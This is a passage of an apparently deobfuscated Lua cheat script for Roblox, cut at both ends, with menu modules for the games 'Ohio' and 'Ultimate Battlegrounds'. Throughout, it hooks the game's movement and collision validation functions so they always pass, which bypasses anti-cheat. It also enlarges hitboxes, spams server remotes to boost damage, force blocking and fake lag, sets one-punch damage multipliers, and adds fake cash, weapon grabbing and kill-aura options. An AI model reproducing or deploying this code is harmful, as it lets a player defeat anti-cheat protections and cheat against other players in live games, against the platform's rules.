													ohioFakeMoneyTask = Spawn(function()
														while tbl30.FakeCash.Enabled do
															updateMoney(nil, nil, tonumber(tbl30.FakeCash.Cash) or 0)
															Wait()
														end
													end)
												end
											end,
										})
										:CreateInput({
											Id = "ohio-misc-fake-cash-input",
											Name = "Amount",
											Default = tbl30.FakeCash.Cash,
											Placeholder = "Number",
											Callback = function(arg)
												tbl30.FakeCash.Cash = tonumber(arg) or tbl30.FakeCash.Cash
											end,
										})

									ohioMisc
										:CreateModule({ Id = "ohio-misc-unlock-skin", Name = "Unlock Skin" })
										:CreateButton({
											Id = "ohio-misc-unlock-skin",
											Name = "Unlock",
											Callback = function()
												fn88()
											end,
										})

									local tbl31 = {}
									local v18 = fn116(tbl20)

									for i = 1, #v18 do
										local v19 = v18[i]
										Insert(tbl31, { Value = v19, Key = v19:lower():gsub("[^%w]+", "_") })
									end

									ohioMisc
										:CreateModule({ Id = "ohio-misc-fake-wallet", Name = "Fake Wallet" })
										:CreateSelector({
											Id = "ohio-misc-fake-wallet",
											Name = "Wallet",
											Options = tbl31,
											Default = tbl30.FakeWallet,
											Callback = function(fakeWallet)
												tbl30.FakeWallet = fakeWallet
												fn89(fakeWallet)
											end,
										})

									local tbl32 = {}
									local v19 = fn116(tbl16)

									for i = 1, #v19 do
										local v20 = v19[i]
										Insert(tbl32, { Value = v20, Key = v20:lower():gsub("[^%w]+", "_") })
									end

									local beautifyItems = ohioMisc:CreateModule({
										Id = "ohio-misc-beautify-items",
										Name = "Beautify Items",
										Default = tbl30.Beautify.Enabled,
										Callback = function(arg)
											tbl30.Beautify.Enabled = arg == true
											fn91(arg == true)
										end,
									})

									local tbl33 = {}
									local tbl34 = {}

									for i = 1, #tbl16 do
										local v20 = tbl16[i]

										if v20 and not tbl34[v20] then
											tbl34[v20] = true
											Insert(tbl33, v20)
										end
									end

									for i = 1, #tbl18 do
										local v20 = tbl18[i]

										if v20 and not tbl34[v20] then
											tbl34[v20] = true
											Insert(tbl33, v20)
										end
									end

									for i = 1, #tbl33 do
										local v20 = tbl33[i]

										beautifyItems:CreateButton({
											Id = "ohio-misc-beautify-balloon-" .. v20:lower():gsub("[^%w]+", "_"),
											Name = "Balloon → " .. v20,
											Callback = function()
												tbl25.BalloonTarget = v20
												tbl30.Beautify.BalloonTarget = v20

												if flag then
													fn90(true, true)
												end
											end,
										})
									end

									beautifyItems:CreateButton({
										Id = "ohio-misc-beautify-kunai-spirit",
										Name = "Kunai → Spirit Kunai",
										Callback = function()
											tbl25.Kunai = true
											tbl30.Beautify.Kunai = true

											if flag then
												fn90(true, true)
											end
										end,
									})

									beautifyItems:CreateButton({
										Id = "ohio-misc-beautify-candy-blue",
										Name = "Candy Cane → Blue Candy Cane",
										Callback = function()
											tbl25.CandyCane = true
											tbl30.Beautify.CandyCane = true

											if flag then
												fn90(true, true)
											end
										end,
									})

									beautifyItems:CreateButton({
										Id = "ohio-misc-beautify-scythe-spectral",
										Name = "Scythe → Spectral Scythe",
										Callback = function()
											tbl25.Scythe = true
											tbl30.Beautify.Scythe = true

											if flag then
												fn90(true, true)
											end
										end,
									})

									local getGun = ohioMisc:CreateModule({ Id = "ohio-misc-get-gun", Name = "Get Gun" })

									for i = 1, #tbl14 do
										local v20 = tbl14[i]
										local str3 = v20:lower():gsub("[^%w]+", "_")

										getGun:CreateToggle({
											Id = "ohio-misc-get-gun-" .. str3,
											Name = v20,
											NameKey = "ohio_misc_get_gun_" .. str3,
											Default = fn103(tbl30.GetGun, v20),
											Callback = function(arg)
												fn113(tbl30.GetGun, v20, arg)
												tbl21 = fn82(tbl30.GetGun)
												fn83(tbl13, tbl21)
											end,
										})
									end

									local buyGun = ohioMisc:CreateModule({ Id = "ohio-misc-buy-gun", Name = "Buy Gun" })

									for i = 1, #tbl14 do
										local v20 = tbl14[i]

										buyGun:CreateButton({
											Id = "ohio-misc-buy-gun-" .. v20:lower():gsub("[^%w]+", "_"),
											Name = v20,
											Callback = function()
												if fn71(v20) then
													Spawn(fn92, v20, true)
												else
													Spawn(fn92, v20)
												end
											end,
										})
									end

									local getBalloon =
										ohioMisc:CreateModule({ Id = "ohio-misc-get-balloon", Name = "Get Balloon" })

									for i = 1, #tbl16 do
										local v20 = tbl16[i]
										local str3 = v20:lower():gsub("[^%w]+", "_")

										getBalloon:CreateToggle({
											Id = "ohio-misc-get-balloon-" .. str3,
											Name = v20,
											NameKey = "ohio_misc_get_balloon_" .. str3,
											Default = fn103(tbl30.GetBalloon, v20),
											Callback = function(arg)
												fn113(tbl30.GetBalloon, v20, arg)
												tbl22 = fn82(tbl30.GetBalloon)
												fn83(tbl15, tbl22)
											end,
										})
									end

									local getKunai =
										ohioMisc:CreateModule({ Id = "ohio-misc-get-kunai", Name = "Get Kunai" })

									for i = 1, #tbl18 do
										local v20 = tbl18[i]
										local str3 = v20:lower():gsub("[^%w]+", "_")

										getKunai:CreateToggle({
											Id = "ohio-misc-get-kunai-" .. str3,
											Name = v20,
											NameKey = "get_kunai_" .. str3,
											Default = fn103(tbl30.GetKunai, v20),
											Callback = function(arg)
												fn113(tbl30.GetKunai, v20, arg)
												tbl23 = fn82(tbl30.GetKunai)
												fn83(tbl17, tbl23)
											end,
										})
									end

									fn85()
								end

								fn115()
							end
						end,
						["Ultimate Battlegrounds"] = function()
							local Core = require(ReplicatedStorage:WaitForChild("Core"))
							local playerScripts = LocalPlayer:WaitForChild("PlayerScripts")
							local Hit = require(playerScripts.Combat.Hit)
							local VFXHelp = require(ReplicatedStorage:WaitForChild("Assets"):WaitForChild("VFXHelp"))
							local sound = playerScripts:WaitForChild("Cache"):WaitForChild("Sound")
							local console = playerScripts:WaitForChild("Test"):WaitForChild("Console")
							local tbl9 = { "validatecollisions", "validatemovement", "validatevelocity", "validate" }

							Spawn(function()
								Wait()
								local v10 = next
								local v11, v12 = getgc(true)

								for _, v13 in v10, v11, v12 do
									if typeof(v13) == "function" then
										local v14 = debug.getinfo(v13)

										if v14.name then
											if Find(tbl9, v14.name:lower()) then
												local v15 = hookfunction

												local v16 = luraph_runtime1(function()
													return true
												end)

												v15(v13, v16)
											end

											local source = v14.source

											if source and source:lower():find("block") then
												if v14.name:lower() == "check" then
													checkBlock = v13
												end
											end
										end
									end
								end
							end)

							if checkBlock then
								Connect(RunService.Heartbeat, checkBlock)
								fn7("No Delay Block", "Failed", 5)
							else
								fn7("No Delay Block", "Success", 5)
							end

							local ubgSettings = window:CreateTab({ Id = "ubg-settings", Name = "UBG Settings" })

							local tbl10 = {
								Hitbox = false,
								Legit = false,
								Visualize = false,
								DashPatch = false,
								DamageBoost = 0,
								SizeX = 5,
								SizeY = 5,
								SizeZ = 5,
								SilentBlock = false,
								FakeLag = false,
								FakeLagModule = nil,
								FakeLagInterval = 0.1,
							}

							local box = nil
							local process = nil
							local event = nil

							local tbl11 = {
								EarlyThreshold = 0.2625,
								UppercutThreshold = 0.375,
								ForceRagdollAction = true,
								ForceDirection = true,
								ClearKnockback = true,
								UseFromCFrame = true,
							}

							local v10 = nil
							local v11 = nil
							local flag = false

							local function fn68(arg, arg2)
								local isExcludedCharacter = getgenv and getgenv().isExcludedCharacter
								if typeof(isExcludedCharacter) ~= "function" then
									return arg, arg2
								end

								if arg and isExcludedCharacter(arg) then
									arg = nil
								end

								if type(arg2) == "table" then
									for i = #arg2, 1, -1 do
										if isExcludedCharacter(arg2[i]) then
											Remove(arg2, i)
										end
									end
								end

								return arg, arg2
							end

							local function fn69(arg)
								local emptyVector3 = arg or EmptyVector3

								return NewVector3(
									emptyVector3.X + tbl10.SizeX,
									emptyVector3.Y + tbl10.SizeY,
									emptyVector3.Z + tbl10.SizeZ
								)
							end

							local function fn70(arg, size)
								if not tbl10.Visualize then
									return
								end
								local cFrame = arg[3].CFrame or arg[3].cf or arg[3].Frame

								if not cFrame and typeof(arg[2]) == "CFrame" then
									cFrame = arg[2]
								elseif not cFrame and typeof(arg[2]) == "Instance" and arg[2]:IsA("BasePart") then
									cFrame = arg[2].CFrame
								end

								if not cFrame then
									local character = LocalPlayer.Character
									cFrame = character and FindFirstChild(character, "HumanoidRootPart")
									cFrame = cFrame and cFrame.CFrame or NewCFrame()
								end

								local Part = NewInstance("Part")
								Part.Name = "HitboxVisualizer"
								Part.Anchored = true
								Part.CanCollide = false
								Part.Material = Enum.Material.ForceField
								Part.Color = NewRGB(255, 0, 0)
								Part.Transparency = 0.7
								Part.Size = size
								Part.CFrame = cFrame
								Part.CastShadow = false
								Part.Parent = workspace
								Debris:AddItem(Part, 0.08)
							end

							local function fn71(arg)
								if type(Hit.Box) ~= "function" then
									return
								end

								if not box then
									box = Hit.Box
								end

								if not event then
									event = Core.Get("Combat", "Action").Event
								end

								if arg then
									Hit.Box = function(...)
										local v12 = table.pack(...)
										local tbl12 = { ... }
										if not tbl12[3] or type(tbl12[3]) ~= "table" then
											return box(table.unpack(v12, 1, v12.n))
										end
										local v13 = fn69(tbl12[3].Size)
										fn70(tbl12, v13)

										if tbl10.Legit then
											local tbl13 = {}

											for k, v14 in pairs(tbl12[3]) do
												tbl13[k] = v14
											end

											tbl13.Size = v13
											local v14, v15, v16 = box(tbl12[1], tbl12[2], tbl13)
											local v17, v18 = fn68(v14, v15)
											return v17, v18, v16
										end

										local v14, v15, v16 = box(tbl12[1], tbl12[2], { Size = v13 })
										local v17, v18 = fn68(v14, v15)
										return v17, v18, v16
									end

									Core.Get("Combat", "Action").Event = function(arg2, arg3, arg4, arg5, arg6, ...)
										if arg6 then
											local v12 = nil

											if arg6.RunOnUpdate then
												local runOnUpdate = arg6.RunOnUpdate

												arg6.RunOnUpdate = function(arg7, arg8)
													if not v12 then
														local v13 = Core.Get("Combat", "Hit").Box(
															nil,
															arg7,
															{ Size = NewVector3(6, 3.5, 6), Offset = NewCFrame() },
															{},
															nil,
															nil,
															nil,
															nil,
															nil,
															nil
														)

														if v13 then
															v12 = v13
														end
													end

													return runOnUpdate(arg7, arg8)
												end
											end

											if arg6.RunBeforeActions then
												local runBeforeActions = arg6.RunBeforeActions

												arg6.RunBeforeActions = function(arg7, arg8, arg9)
													return runBeforeActions(v12 or arg7, arg8, arg9)
												end
											end
										end

										local v12 = event
										local v13 = table.pack(...)
										v13.n = 6 + v13.n - 1
										table.move(v13, 1, v13.n, 6, v13)
										v13[1] = arg2
										v13[2] = arg3
										v13[3] = arg4
										v13[4] = arg5
										v13[5] = arg6
										return v12(table.unpack(v13, 1, v13.n))
									end
								elseif box then
									Hit.Box = box
									Core.Get("Combat", "Action").Event = event
								end
							end

							local function fn72()
								local data3 = FindFirstChild(LocalPlayer, "Data")
								local value = data3 and FindFirstChild(data3, "Character")
								value = value and value.Value
								local characters = FindFirstChild(ReplicatedStorage, "Characters")
								local v12 = characters and value and FindFirstChild(characters, value)
								return v12 and FindFirstChild(v12, "WallCombo")
							end

							local function fn73()
								if tbl10.Legit then
									return
								end
								local character = LocalPlayer.Character
								local humanoidRootPart = character and FindFirstChild(character, "HumanoidRootPart")
								if not humanoidRootPart then
									return
								end

								pcall(function()
									local cFrame = humanoidRootPart.CFrame
									Core.Library("Remote").Send("Dash", cFrame, "L", 1)
								end)
							end

							local function fn74(arg)
								local remotes = FindFirstChild(ReplicatedStorage, "Remotes")
								local abilities = remotes and FindFirstChild(remotes, "Abilities")
								remotes = remotes and FindFirstChild(remotes, "Combat")
								local ability = abilities and FindFirstChild(abilities, "Ability")
								local action = remotes and FindFirstChild(remotes, "Action")
								if not ability or not action then
									return
								end
								local v12 = fn72()
								local n4 = Floor(tbl10.DamageBoost)

								if n4 <= 0 then
									ability:FireServer(nil, 69)

									action:FireServer(
										nil,
										"",
										4,
										69,
										{ BestHitCharacter = nil, HitCharacters = arg, Ignore = {}, Actions = {} }
									)

									return
								end

								if not v12 then
									return
								end

								for i = 1, n4 do
									ability:FireServer(v12, 69)

									action:FireServer(
										v12,
										"",
										4,
										69,
										{ BestHitCharacter = nil, HitCharacters = arg, Ignore = {}, Actions = {} }
									)
								end
							end

							local function fn75()
								if type(Hit.Process) ~= "function" then
									return
								end

								if not process then
									process = Hit.Process
								end

								Hit.Process = function(...)
									local v12, v13, v14 = process(...)
									local v15, v16 = fn68(v12, v13)
									if type(v16) ~= "table" or #v16 == 0 then
										return v15, v16, v14
									end
									fn73()
									pcall(fn74, v16)
									return v15, v16, v14
								end
							end

							local function fn76()
								if not process then
									return
								end
								Hit.Process = process
							end

							local function fn77(arg)
								local dash = playerScripts:WaitForChild("Combat"):WaitForChild("Dash")

								for _, v12 in pairs(getgc(true)) do
									if typeof(v12) ~= "function" then
										continue
									end

									if getfenv(v12).script == dash and debug.getinfo(v12).name == arg then
										return v12
									end
								end

								return nil
							end

							local punchAnimation = nil
							local vfx = nil

							local v12 = luraph_runtime1(function(arg, arg2, arg3, arg4)
								local v12 = Core
								local cFrame = v12.Services.Camera.CFrame
								local v13 = Clock()
								local str3 = tostring(v13)
								local v14 = nil
								local v15 = nil
								local v16 = nil
								local v17 = nil
								local v18 = nil
								local flag2 = false
								local flag3 = false

								local function fn78(arg5, arg6, arg7, arg8, arg9)
									local v19 = v12.Get("Combat", "Ragdoll").GetRagdollFrame(arg5)
									local v20 = v12.Get("Character", "FullCustomReplication").GetCFrame(arg)
									local v21 = v12.Get("Character", "FullCustomReplication").GetCFrame(arg5)
									local flag4 = not arg7

									if not flag4 then
										if v20 and v21 then
											flag4 = Abs(arg6 + v20.Position.Y - v21.Position.Y) < arg7
										end
									end

									local flag5 = not arg8 or v19 and v19.Velocity.Y < 0
									local flag6 = not arg9

									if not flag6 then
										if v20 and v21 then
											flag6 = v21.Position.Y > v20.Position.Y
										else
											flag6 = v21
										end
									end

									v18 = flag4 and flag5 and flag6
									return v18
								end

								local function fn79(arg5, arg6)
									local v19 = v12.Get("Combat", "Ragdoll").GetRagdollFrame(arg5)
									local flag4 = v12.Get("Combat", "Ragdoll").UpVelocities[arg5]

									if v19 then
										if v19.Velocity.Y < 0 and flag4 then
											flag4 = flag4 > 1 and arg6.CollisionGroup ~= "NoCharacterCollisions"
										else
											flag4 = false
										end
									end

									return flag4
								end

								local function fn80(arg5, arg6, arg7)
									if v12.Library("Instance").Exists(arg2) then
										local v19, v20 = v12.Get("Combat", "Hit").Box(nil, arg, {
											Size = arg5,
											Offset = arg6,
											IgnoreJump = true,
											IgnoreRagdolls = "Ground",
											IgnoreKnockback = true,
											NoBaseValidation = true,
											RequireInFront = true,
											BlockHitsThroughWalls = true,
											CustomValidation = arg7,
										})

										v15 = v19
										v14 = v20

										local v21, v22 = v12.Get("Combat", "Hit").Box(nil, arg, {
											Size = arg5,
											Offset = arg6,
											IgnoreJump = true,
											IgnoreRagdolls = "Ground",
											IgnoreKnockback = true,
											RequireInFront = true,
											BlockHitsThroughWalls = true,
											CustomValidation = arg7,
										})

										v17 = v21
										v16 = v22
										return #v14 > 0
									end
								end

								local v19 = v17
								local n4 = 0
								local n5 = 0

								local function fn81(arg5, arg6)
									return (not GetAttribute(arg5, "Ragdoll") or fn78(arg5, 2, 0.25, true))
										and arg6.CollisionGroup ~= "NoCharacterCollisions"
								end

								local n6 = 0
								local v20 = nil
								local n7, n8, n9, n10

								while true do
									Wait()
									local cFrame2 = v12.Services.Camera.CFrame
									local v21, v22 = cFrame:ToOrientation()
									local v23, v24 = cFrame2:ToOrientation()
									local v25 = math.deg(v22 - v24)

									if v25 > 180 then
										v25 -= 360
									elseif v25 < -180 then
										v25 += 360
									end

									n6 += v25
									n7 = Max(n5, n6)
									n8 = Min(n4, n6)
									n9 = Clock() - v13
									n10 = arg3 - n9

									if n9 > 0.2125 then
										v20 = fn80(NewVector3(1, 1, 1), NewCFrame(0, 7.5, -0.5), fn79)
											or fn80(NewVector3(5, 5, 4.5), NewCFrame(0, 0, -2), fn81)
									end

									if not (v20 or arg4 < n9) then
										n4 = n8
										n5 = n7
										cFrame = cFrame2
										continue
									end

									break
								end

								local flag4 = n10 > 0 and true or nil
								v20 = v20 or fn80(NewVector3(7.5, 5, 7), NewCFrame(0, 0, -2.75), fn81)

								if v20 then
									v12.Get("Character", "Move").SetJumpOverride("DashPunch", 0)
									Delay(0.5, v12.Get("Character", "Move").SetJumpOverride, "DashPunch", nil)
								end

								Spawn(function()
									local tbl12 = {
										Guarantees = v19,
										Replace = function(arg5)
											local uppercutThreshold = v12.Get("Combat", "Knockback").CharacterPresets[arg5]
														== "Uppercut"
													and tbl11.UppercutThreshold
												or tbl11.EarlyThreshold

											local ok4, result4 = pcall(function()
												return v12.Get("Combat", "Ragdoll").GetRagdoll(arg5)
											end)

											if not ok4 then
												result4 = nil
											end

											local ok5, result5 = pcall(function()
												return v12.Get("Combat", "Ragdoll").GetRagdollFrame(arg5)
											end)

											if not ok5 then
												result5 = nil
											end

											local flag5 = false

											if arg5 and arg5.GetAttribute then
												pcall(function()
													flag5 = GetAttribute(arg5, "Ragdoll")
												end)
											end

											local flag6 = result4 ~= nil or result5 ~= nil or flag5 == true

											local ok6, result6 = pcall(function()
												return arg5
													and v12.Get("Character", "FullCustomReplication").GetCFrame(arg5)
											end)

											ok6 = ok6 and result6
											local forceDirection = nil

											if ok6 then
												forceDirection = arg2.CFrame
													* Angles(
														0,
														Rad(
															-Clamp(
																arg2.CFrame:PointToObjectSpace(result6.Position).X
																	* 180
																	/ 2,
																-180,
																180
															)
														),
														0
													)
											end

											local getAttribute = arg5 and arg5.GetAttribute
											local flag7 = false

											if getAttribute then
												local ok7, result7 = pcall(function()
													return GetAttribute(arg5, "Knockback")
												end)

												if ok7 and result7 then
													flag7 = true
												end
											end

											if flag6 and tbl11.ForceRagdollAction then
												local tbl12 = { ActionNumbers = { 2, 6 } }
												forceDirection = tbl11.ForceDirection and forceDirection or nil
												tbl12.ForceDirection = forceDirection
												return tbl12
											end

											if n9 < uppercutThreshold then
												if tbl11.ClearKnockback and arg5 and arg5.SetAttribute then
													pcall(function()
														SetAttribute(arg5, "Knockback", false)
													end)
												end

												local tbl12 = { ActionNumbers = { 1, 6 } }
												forceDirection = tbl11.ForceDirection and forceDirection or nil
												tbl12.ForceDirection = forceDirection
												return tbl12
											end

											if n7 - n8 > 180 then
												if result4 then
													fn78(arg5, 0, 2, nil, true)
												end
											end

											local flag8 = flag4 and not result4

											if n9 >= uppercutThreshold and tbl11.ClearKnockback then
												pcall(function()
													if arg5 and arg5.SetAttribute then
														SetAttribute(arg5, "Knockback", false)
													end
												end)
											end

											local n11

											if flag7 then
												n11 = 5
											elseif flag8 then
												n11 = 4
											else
												n11 = 1
											end

											return {
												ActionNumbers = { n11, 6 },
												ForceDirection = tbl11.ForceDirection
														and (flag8 and forceDirection or nil)
													or nil,
											}
										end,
										UseFromCFrame = tbl11.UseFromCFrame
												and flag4
												and arg2.CFrame * NewCFrame(0, 0, -2)
											or nil,
									}

									Wait(0.15)
									flag3 = true

									local v21, v22, v23, v24, v25 = v12.Get("Combat", "Action")
										.Event(nil, arg, "PunchDash", str3, tbl12, 0)

									if v21 then
										vfx("DashHit", v21, arg2.Position)

										v12.Get("Camera", "Shake").Shake(nil, nil, {
											Amplitude = 1.25,
											Frequency = 0.0875,
											FadeInTime = 0.025,
											FadeOutTime = 0.5,
										}, nil, arg, table.unpack(v22))
									end

									local blockedCharacters = v25 and (v25.BlockedCharacters or {}) or {}
									local flag5 = false

									for _, v26 in blockedCharacters, nil, nil do
										if not Find(v25.HitCharacters, v26) then
											flag5 = true
										end
									end

									flag2 = flag5
									flag3 = false
								end)

								if n10 > 0 then
									v12.Services.Run.Heartbeat:Wait()
									Wait(n10 + 0.025)
								end

								Spawn(punchAnimation, arg, str3)
								return n10 > 0, v20
							end)

							local function fn78()
								if flag then
									return
								end

								if not punchAnimation then
									punchAnimation = fn77("punchAnimation")
								end

								if not vfx then
									vfx = fn77("vfx")
								end

								local dash = playerScripts:WaitForChild("Combat"):WaitForChild("Dash")

								for _, v13 in pairs(getgc(true)) do
									if typeof(v13) == "function" then
										if getfenv(v13).script == dash and debug.getinfo(v13).name == "runAttack" then
											v11 = v13
											v10 = hookfunction(v13, v12)
											flag = true
											getgenv().LegitKombatEnabled = true
											break
										end
									end
								end
							end

							local function fn79()
								if not flag or not v10 or not v11 then
									return
								end
								hookfunction(v11, v10)
								flag = false
								getgenv().LegitKombatEnabled = false
								v11 = nil
								v10 = nil
							end

							local hitbox = ubgSettings:CreateModule({
								Id = "UBG_hitbox",
								Name = "Hitbox",
								Default = tbl10.Hitbox,
								Callback = function(hitbox)
									tbl10.Hitbox = hitbox
									fn71(hitbox)
								end,
							})

							hitbox:CreateToggle({
								Id = "UBG_legit",
								Name = "Legit",
								Default = tbl10.Legit,
								Callback = function(legit)
									tbl10.Legit = legit

									if tbl10.Hitbox then
										fn71(false)
										fn71(true)
									end
								end,
							})

							hitbox:CreateToggle({
								Id = "UBG_visualize",
								Name = "Visualize",
								Default = tbl10.Visualize,
								Callback = function(visualize)
									tbl10.Visualize = visualize
								end,
							})

							hitbox:CreateToggle({
								Id = "UBG_dash_patch",
								Name = "Dash Patch",
								Default = tbl10.DashPatch,
								Callback = function(dashPatch)
									tbl10.DashPatch = dashPatch

									if dashPatch then
										fn78()
									else
										fn79()
									end
								end,
							})

							hitbox:CreateSlider({
								Id = "UBG_damage_boost",
								Name = "Damage Boost",
								Min = 0,
								Max = 30,
								Default = tbl10.DamageBoost,
								Step = 1,
								Callback = function(damageBoost)
									local flag2 = tbl10.DamageBoost > 0
									tbl10.DamageBoost = damageBoost

									if not flag2 and damageBoost > 0 then
										fn75()
									elseif flag2 and damageBoost <= 0 then
										fn76()
									end
								end,
							})

							hitbox:CreateSlider({
								Id = "UBG_size_x",
								Name = "Size X",
								Min = 1,
								Max = 200,
								Default = tbl10.SizeX,
								Step = 1,
								Callback = function(sizeX)
									tbl10.SizeX = sizeX

									if tbl10.Hitbox then
										fn71(false)
										fn71(true)
									end
								end,
							})

							hitbox:CreateSlider({
								Id = "UBG_size_y",
								Name = "Size Y",
								Min = 1,
								Max = 200,
								Default = tbl10.SizeY,
								Step = 1,
								Callback = function(sizeY)
									tbl10.SizeY = sizeY

									if tbl10.Hitbox then
										fn71(false)
										fn71(true)
									end
								end,
							})

							hitbox:CreateSlider({
								Id = "UBG_size_z",
								Name = "Size Z",
								Min = 1,
								Max = 200,
								Default = tbl10.SizeZ,
								Step = 1,
								Callback = function(sizeZ)
									tbl10.SizeZ = sizeZ

									if tbl10.Hitbox then
										fn71(false)
										fn71(true)
									end
								end,
							})

							ubgSettings:CreateModule({
								Id = "UBG_silent_block",
								Name = "Silent Block",
								Default = tbl10.SilentBlock,
								Callback = function(silentBlock)
									tbl10.SilentBlock = silentBlock

									coroutine.wrap(function()
										while tbl10.SilentBlock do
											ReplicatedStorage.Remotes.Combat.Block:FireServer(true)
											Wait()
										end

										ReplicatedStorage.Remotes.Combat.Block:FireServer(false)
									end)()
								end,
							})

							tbl10.FakeLagModule = ubgSettings:CreateModule({
								Id = "UBG_fake_lag",
								Name = "Fake Lag",
								Default = tbl10.FakeLag,
								Callback = function(fakeLag)
									tbl10.FakeLag = fakeLag

									coroutine.wrap(function()
										while tbl10.FakeLag do
											ReplicatedStorage.Remotes.Services.Ping:FireServer()
											Wait(tbl10.FakeLagInterval)
										end
									end)()
								end,
							})

							tbl10.FakeLagModule:CreateSlider({
								Id = "UBG_fake_lag_interval",
								Name = "Fake Lag Interval",
								Min = 0,
								Max = 0.5,
								Default = tbl10.FakeLagInterval,
								Step = 0.1,
								Callback = function(fakeLagInterval)
									tbl10.FakeLagInterval = fakeLagInterval
								end,
							})

							ubgSettings:CreateModule({
								Id = "UBG_fast_attack",
								Name = "Fast Attack",
								Default = false,
								Callback = function(arg)
									ReplicatedStorage.Settings.Multipliers.MeleeSpeed.Value = arg and 300 or 100
								end,
							})

							ubgSettings:CreateModule({
								Id = "UBG_one_punch",
								Name = "One Punch",
								Default = false,
								Callback = function(arg)
									ReplicatedStorage.Settings.Multipliers.MeleeDamage.Value = arg and 10000000 or 100
									ReplicatedStorage.Settings.Multipliers.KnockbackPower.Value = arg and 10000 or 100
								end,
							})

							ubgSettings:CreateModule({
								Id = "UBG_endless_ult",
								Name = "Endless Ult",
								Default = false,
								Callback = function(value)
									ReplicatedStorage.Settings.Toggles.Endless.Value = value
								end,
							})

							ubgSettings:CreateModule({
								Id = "UBG_instant_ult",
								Name = "Instant Ult",
								Default = false,
								Callback = function(value)
									ReplicatedStorage.Settings.Toggles.InstantTransformation.Value = value
								end,
							})

							ubgSettings:CreateModule({
								Id = "UBG_multi_ult",
								Name = "Multi Ult",
								Default = false,
								Callback = function(value)
									ReplicatedStorage.Settings.Toggles.MultiUseCutscenes.Value = value
								end,
							})

							ubgSettings:CreateModule({
								Id = "UBG_no_hitstun",
								Name = "No Hitstun",
								Default = false,
								Callback = function(value)
									ReplicatedStorage.Settings.Toggles.DisableHitStun.Value = value
								end,
							})

							ubgSettings:CreateModule({
								Id = "UBG_no_slow",
								Name = "No Slow",
								Default = false,
								Callback = function(value)
									ReplicatedStorage.Settings.Toggles.NoSlowdowns.Value = value
								end,
							})

							ubgSettings:CreateModule({
								Id = "UBG_combat_switch",
								Name = "Combat Switch",
								Default = false,
								Callback = function(value)
									ReplicatedStorage.Settings.Toggles.DisableCombatTimer.Value = value
								end,
							})

							ubgSettings:CreateModule({
								Id = "UBG_no_dash_cd",
								Name = "No Dash CD",
								Default = ReplicatedStorage.Settings.Cooldowns.Dash.Value == 0 and true or false,
								Callback = function(arg)
									ReplicatedStorage.Settings.Cooldowns.Dash.Value = arg and 0 or 100
								end,
							})

							ubgSettings:CreateModule({
								Id = "UBG_no_jumpfatigue",
								Name = "No Jump Fatigue",
								Default = ReplicatedStorage.Settings.Toggles.NoJumpFatigue.Value,
								Callback = function(value)
									ReplicatedStorage.Settings.Toggles.NoJumpFatigue.Value = value
								end,
							})

							local ubgRage = window:CreateTab({ Id = "ubg-rage", Name = "UBG Rage" })

							local tbl12 = {
								InstantRespawn = false,
								AntiGrab = false,
								WallAbuse = false,
								WallAbuseDelay = 0.1,
								WallAbuseDeath = true,
								CarryAbuse = false,
								KillAura = false,
								AbilityAura = false,
								AbilityAuraMode = "Gon",
								PreventRespawn = false,
								Godmode = false,
								WallCrash = false,
								WallCrashDelay = 0.1,
								TPAll = false,
							}

							local tbl13 = { tp = {}, live = {}, team = {}, died = {}, bum = {} }

							local function fn80()
								local tbl14 = {}
								local tbl15 = {}
								local tbl16 = {}
								local tbl17 = {}
								local tbl18 = {}
								local players = GetPlayerList()

								for i = 1, #players do
									local v13 = players[i]

									if not (v13 == LocalPlayer or not CheckState(v13)) then
										local character = v13.Character
										local humanoid = character and FindFirstChild(character, "Humanoid")

										local humanoidRootPart = character
											and FindFirstChild(character, "HumanoidRootPart")

										local highlight = character and FindFirstChild(character, "Highlight")

										if not (not humanoid or not humanoidRootPart or highlight) then
											local character2 = LocalPlayer.Character
												and FindFirstChild(LocalPlayer.Character, "HumanoidRootPart")

											local huge = math.huge

											if character2 then
												huge = (
													humanoidRootPart.Position
													- LocalPlayer.Character.HumanoidRootPart.Position
												).Magnitude
											end

											local team = GetAttribute(v13, "Team")

											if team and team == GetAttribute(LocalPlayer, "Team") then
												Insert(tbl16, { char = character, dist = huge })
											elseif Sub(tostring(Floor(humanoid.Health)), 1, 1) == "0" then
												if not (huge > 160) then
													Insert(tbl17, { char = character, dist = huge })
												end
											else
												Insert(tbl14, { char = character, dist = huge })

												if not (huge > 80) then
													Insert(tbl15, { char = character, dist = huge })
												end
											end
										end
									end
								end

								local children = GetChildren(workspace.Characters.NPCs)

								for i = 1, #children do
									local v13 = children[i]
									local humanoid = v13 and FindFirstChild(v13, "Humanoid")
									local humanoidRootPart = v13 and FindFirstChild(v13, "HumanoidRootPart")

									if not (not humanoid or not humanoidRootPart) then
										local character = LocalPlayer.Character
											and FindFirstChild(LocalPlayer.Character, "HumanoidRootPart")

										local huge = math.huge

										if character then
											huge = (
												humanoidRootPart.Position
												- LocalPlayer.Character.HumanoidRootPart.Position
											).Magnitude
										end

										Insert(tbl18, { char = v13, dist = huge })
									end
								end

								Sort(tbl14, function(arg, arg2)
									return arg.dist < arg2.dist
								end)

								Sort(tbl15, function(arg, arg2)
									return arg.dist < arg2.dist
								end)

								Sort(tbl16, function(arg, arg2)
									return arg.dist < arg2.dist
								end)

								Sort(tbl17, function(arg, arg2)
									return arg.dist < arg2.dist
								end)

								Sort(tbl18, function(arg, arg2)
									return arg.dist < arg2.dist
								end)

								local tp = {}

								for i = 1, #tbl14 do
									Insert(tp, tbl14[i].char)
								end

								tbl13.tp = tp
								local live = {}

								for i = 1, #tbl15 do
									Insert(live, tbl15[i].char)
								end

								tbl13.live = live
								local team = {}

								for i = 1, #tbl16 do
									Insert(team, tbl16[i].char)
								end

								tbl13.team = team
								local died = {}

								for i = 1, #tbl17 do
									Insert(died, tbl17[i].char)
								end

								tbl13.died = died
								local bum = {}

								for i = 1, #tbl18 do
									Insert(bum, tbl18[i].char)
								end

								tbl13.bum = bum
							end

							coroutine.wrap(function()
								while Wait(0.1) do
									fn80()
								end
							end)()

							getCharacter = function(arg)
								if arg then
									return arg.Data.Character.Value
								end
								return LocalPlayer.Data.Character.Value
							end

							getWallcombo = function(arg)
								return ReplicatedStorage.Characters[arg].WallCombo
							end

							getAbility = function(arg, arg2)
								local v13 = ReplicatedStorage.Characters[arg]
								local v14 = FindFirstChild(v13.Abilities, arg2)

								if GetAttribute(LocalPlayer.Character, "TransformationLoaded") then
									v14 = FindFirstChild(v13.Ultimates, arg2)
								end

								return v14
							end

							execDash = function()
								setthreadidentity(2)
								Core.Library("Remote").Send("Dash", nil, "L", 1)
								setthreadidentity(8)
							end

							Action = function()
								return "Action" .. Random(1000, 9999)
